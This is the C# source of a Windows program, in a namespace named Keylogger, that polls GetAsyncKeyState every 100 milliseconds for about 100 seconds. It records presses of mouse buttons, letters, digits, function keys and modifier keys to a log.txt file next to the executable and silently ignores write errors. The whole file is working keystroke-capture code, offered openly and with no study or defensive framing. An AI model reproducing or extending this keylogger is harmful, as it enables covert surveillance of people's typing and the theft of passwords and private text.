using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;

namespace Keylogger
{
    public class Program
    {
        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(int vkey);

        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

        private static string EnvoirmentPath = "";

        static void Main(string[] args)
        {
            LogWrite(DateTime.Now.ToLongTimeString());
            System.Timers.Timer timer = new System.Timers.Timer();
            timer.Elapsed += new ElapsedEventHandler(tEvent);
            timer.Interval = 100;
            timer.Enabled = true;
            Thread.Sleep(100000);
        }

        private static void tEvent(object source, ElapsedEventArgs e)
        {
            if (GetAsyncKeyState(0x01) < 0)
            {
                LogWrite("Left Mouse Pressed");
            }
            if (GetAsyncKeyState(0x02) < 0)
            {
                LogWrite("Right Mouse Pressed");
            }
            if (GetAsyncKeyState(0x04) < 0)
            {
                LogWrite("Middle Mouse Pressed");
            }
            if (GetAsyncKeyState(0x08) < 0)
            {
                LogWrite("Backspace Pressed");
            }
            if (GetAsyncKeyState(0x09) < 0)
            {
                LogWrite("Tab Pressed");
            }
            if (GetAsyncKeyState(0x0D) < 0)
            {
                LogWrite("Enter Pressed");
            }
            if (GetAsyncKeyState(0x10) < 0)
            {
                LogWrite("Shift Pressed");
            }
            if (GetAsyncKeyState(0x11) < 0)
            {
                LogWrite("CTRL Pressed");
            }
            if (GetAsyncKeyState(0x12) < 0)
            {
                LogWrite("ALT Pressed");
            }
            if (GetAsyncKeyState(0x13) < 0)
            {
                LogWrite("Pause Pressed");
            }
            if (GetAsyncKeyState(0x14) < 0)
            {
                LogWrite("Caps Lock Pressed");
            }
            if (GetAsyncKeyState(0x1B) < 0)
            {
                LogWrite("Escape Key Pressed");
            }
            if (GetAsyncKeyState(0x20) < 0)
            {
                LogWrite("Spacebar Key Pressed");
            }
            if (GetAsyncKeyState(0x21) < 0)
            {
                LogWrite("Page Up Key Pressed");
            }
            if (GetAsyncKeyState(0x22) < 0)
            {
                LogWrite("Page Down Key Pressed");
            }
            if (GetAsyncKeyState(0x23) < 0)
            {
                LogWrite("End Key Pressed");
            }
            if (GetAsyncKeyState(0x24) < 0)
            {
                LogWrite("Home Key Pressed");
            }
            if (GetAsyncKeyState(0x25) < 0)
            {
                LogWrite("Left Arrow Pressed");
            }
            if (GetAsyncKeyState(0x26) < 0)
            {
                LogWrite("Up Arrow Pressed");
            }
            if (GetAsyncKeyState(0x27) < 0)
            {
                LogWrite("Right Arrow Pressed");
            }
            if (GetAsyncKeyState(0x28) < 0)
            {
                LogWrite("Down Arrow Pressed");
            }
            if (GetAsyncKeyState(0x29) < 0)
            {
                LogWrite("Select Key Pressed");
            }
            if (GetAsyncKeyState(0x2A) < 0)
            {
                LogWrite("Print Key Pressed");
            }
            if (GetAsyncKeyState(0x2C) < 0)
            {
                LogWrite("Print Screen Pressed");
            }
            if (GetAsyncKeyState(0x2D) < 0)
            {
                LogWrite("Insert Key Pressed");
            }
            if (GetAsyncKeyState(0x2E) < 0)
            {
                LogWrite("Delete Key Pressed");
            }
            if (GetAsyncKeyState(0x30) < 0)
            {
                LogWrite("0 Key Pressed");
            }
            if (GetAsyncKeyState(0x31) < 0)
            {
                LogWrite("1 Key Pressed");
            }
            if (GetAsyncKeyState(0x32) < 0)
            {
                LogWrite("2 Key Pressed");
            }
            if (GetAsyncKeyState(0x33) < 0)
            {
                LogWrite("3 Key Pressed");
            }
            if (GetAsyncKeyState(0x34) < 0)
            {
                LogWrite("4 Key Pressed");
            }
            if (GetAsyncKeyState(0x35) < 0)
            {
                LogWrite("5 Key Pressed");
            }
            if (GetAsyncKeyState(0x36) < 0)
            {
                LogWrite("6 Key Pressed");
            }
            if (GetAsyncKeyState(0x37) < 0)
            {
                LogWrite("7 Key Pressed");
            }
            if (GetAsyncKeyState(0x38) < 0)
            {
                LogWrite("8 Key Pressed");
            }
            if (GetAsyncKeyState(0x39) < 0)
            {
                LogWrite("9 Key Pressed");
            }
            if (GetAsyncKeyState(0x41) < 0)
            {
                LogWrite("A Key Pressed");
            }
            if (GetAsyncKeyState(0x42) < 0)
            {
                LogWrite("B Key Pressed");
            }
            if (GetAsyncKeyState(0x43) < 0)
            {
                LogWrite("C Key Pressed");
            }
            if (GetAsyncKeyState(0x44) < 0)
            {
                LogWrite("D Key Pressed");
            }
            if (GetAsyncKeyState(0x45) < 0)
            {
                LogWrite("E Key Pressed");
            }
            if (GetAsyncKeyState(0x46) < 0)
            {
                LogWrite("F Key Pressed");
            }
            if (GetAsyncKeyState(0x47) < 0)
            {
                LogWrite("G Key Pressed");
            }
            if (GetAsyncKeyState(0x48) < 0)
            {
                LogWrite("H Key Pressed");
            }
            if (GetAsyncKeyState(0x49) < 0)
            {
                LogWrite("I Key Pressed");
            }
            if (GetAsyncKeyState(0x4A) < 0)
            {
                LogWrite("J Key Pressed");
            }
            if (GetAsyncKeyState(0x4B) < 0)
            {
                LogWrite("K Key Pressed");
            }
            if (GetAsyncKeyState(0x4C) < 0)
            {
                LogWrite("L Key Pressed");
            }
            if (GetAsyncKeyState(0x4D) < 0)
            {
                LogWrite("M Key Pressed");
            }
            if (GetAsyncKeyState(0x4E) < 0)
            {
                LogWrite("N Key Pressed");
            }
            if (GetAsyncKeyState(0x4F) < 0)
            {
                LogWrite("O Key Pressed");
            }
            if (GetAsyncKeyState(0x50) < 0)
            {
                LogWrite("P Key Pressed");
            }
            if (GetAsyncKeyState(0x51) < 0)
            {
                LogWrite("Q Key Pressed");
            }
            if (GetAsyncKeyState(0x52) < 0)
            {
                LogWrite("R Key Pressed");
            }
            if (GetAsyncKeyState(0x53) < 0)
            {
                LogWrite("S Key Pressed");
            }
            if (GetAsyncKeyState(0x54) < 0)
            {
                LogWrite("T Key Pressed");
            }
            if (GetAsyncKeyState(0x55) < 0)
            {
                LogWrite("U Key Pressed");
            }
            if (GetAsyncKeyState(0x56) < 0)
            {
                LogWrite("V Key Pressed");
            }
            if (GetAsyncKeyState(0x57) < 0)
            {
                LogWrite("W Key Pressed");
            }
            if (GetAsyncKeyState(0x58) < 0)
            {
                LogWrite("X Key Pressed");
            }
            if (GetAsyncKeyState(0x59) < 0)
            {
                LogWrite("Y Key Pressed");
            }
            if (GetAsyncKeyState(0x5A) < 0)
            {
                LogWrite("Z Key Pressed");
            }
            if (GetAsyncKeyState(0x5B) < 0)
            {
                LogWrite("Left Windows Key Pressed");
            }
            if (GetAsyncKeyState(0x5C) < 0)
            {
                LogWrite("Right Windows Key Pressed");
            }
            if (GetAsyncKeyState(0x60) < 0)
            {
                LogWrite("Numeric 0 Key Pressed");
            }
            if (GetAsyncKeyState(0x61) < 0)
            {
                LogWrite("Numeric 1 Key Pressed");
            }
            if (GetAsyncKeyState(0x62) < 0)
            {
                LogWrite("Numeric 2 Key Pressed");
            }
            if (GetAsyncKeyState(0x63) < 0)
            {
                LogWrite("Numeric 3 Key Pressed");
            }
            if (GetAsyncKeyState(0x64) < 0)
            {
                LogWrite("Numeric 4 Key Pressed");
            }
            if (GetAsyncKeyState(0x65) < 0)
            {
                LogWrite("Numeric 5 Key Pressed");
            }
            if (GetAsyncKeyState(0x66) < 0)
            {
                LogWrite("Numeric 6 Key Pressed");
            }
            if (GetAsyncKeyState(0x67) < 0)
            {
                LogWrite("Numeric 7 Key Pressed");
            }
            if (GetAsyncKeyState(0x68) < 0)
            {
                LogWrite("Numeric 8 Key Pressed");
            }
            if (GetAsyncKeyState(0x69) < 0)
            {
                LogWrite("Numeric 9 Key Pressed");
            }
            if (GetAsyncKeyState(0x6A) < 0)
            {
                LogWrite("Multiply Key Pressed");
            }
            if (GetAsyncKeyState(0x6B) < 0)
            {
                LogWrite("Add Key Pressed");
            }
            if (GetAsyncKeyState(0x6C) < 0)
            {
                LogWrite("Seperator Key Pressed");
            }
            if (GetAsyncKeyState(0x6D) < 0)
            {
                LogWrite("Subtract Key Pressed");
            }
            if (GetAsyncKeyState(0x6E) < 0)
            {
                LogWrite("Decimal Key Pressed");
            }
            if (GetAsyncKeyState(0x6F) < 0)
            {
                LogWrite("Divide Key Pressed");
            }
            if (GetAsyncKeyState(0x70) < 0)
            {
                LogWrite("F1 Key Pressed");
            }
            if (GetAsyncKeyState(0x71) < 0)
            {
                LogWrite("F2 Key Pressed");
            }
            if (GetAsyncKeyState(0x72) < 0)
            {
                LogWrite("F3 Key Pressed");
            }
            if (GetAsyncKeyState(0x73) < 0)
            {
                LogWrite("F4 Key Pressed");
            }
            if (GetAsyncKeyState(0x74) < 0)
            {
                LogWrite("F5 Key Pressed");
            }
            if (GetAsyncKeyState(0x75) < 0)
            {
                LogWrite("F6 Key Pressed");
            }
            if (GetAsyncKeyState(0x76) < 0)
            {
                LogWrite("F7 Key Pressed");
            }
            if (GetAsyncKeyState(0x77) < 0)
            {
                LogWrite("F8 Key Pressed");
            }
            if (GetAsyncKeyState(0x78) < 0)
            {
                LogWrite("F9 Key Pressed");
            }
            if (GetAsyncKeyState(0x79) < 0)
            {
                LogWrite("F10 Key Pressed");
            }
            if (GetAsyncKeyState(0x7A) < 0)
            {
                LogWrite("F11 Key Pressed");
            }
            if (GetAsyncKeyState(0x7B) < 0)
            {
                LogWrite("F12 Key Pressed");
            }
            if (GetAsyncKeyState(0x90) < 0)
            {
                LogWrite("Num Lock Key Pressed");
            }
            if (GetAsyncKeyState(0x91) < 0)
            {
                LogWrite("Scroll Lock Key Pressed");
            }
            if (GetAsyncKeyState(0xA0) < 0)
            {
                LogWrite("Left Shift Key Pressed");
            }
            if (GetAsyncKeyState(0xA1) < 0)
            {
                LogWrite("Right Shift Key Pressed");
            }
            if (GetAsyncKeyState(0xA2) < 0)
            {
                LogWrite("Left Control Key Pressed");
            }
            if (GetAsyncKeyState(0xA3) < 0)
            {
                LogWrite("Right Control Key Pressed");
            }
            if (GetAsyncKeyState(0xA4) < 0)
            {
                LogWrite("Left Alt Key Pressed");
            }
            if (GetAsyncKeyState(0xA5) < 0)
            {
                LogWrite("Right Alt Key Pressed");
            }
        }


        public static void LogWrite(string logMessage)
        {
            EnvoirmentPath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            try
            {
                using (StreamWriter w = File.AppendText(EnvoirmentPath + "\\" + "log.txt"))
                {
                    Log(logMessage, w);
                }
            }
            catch (Exception ex)
            {
            }
        }

        public static void Log(string logMessage, TextWriter txtWriter)
        {
            try
            {
                txtWriter.WriteLine(logMessage);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.ToString());
            }
        }

    }
}
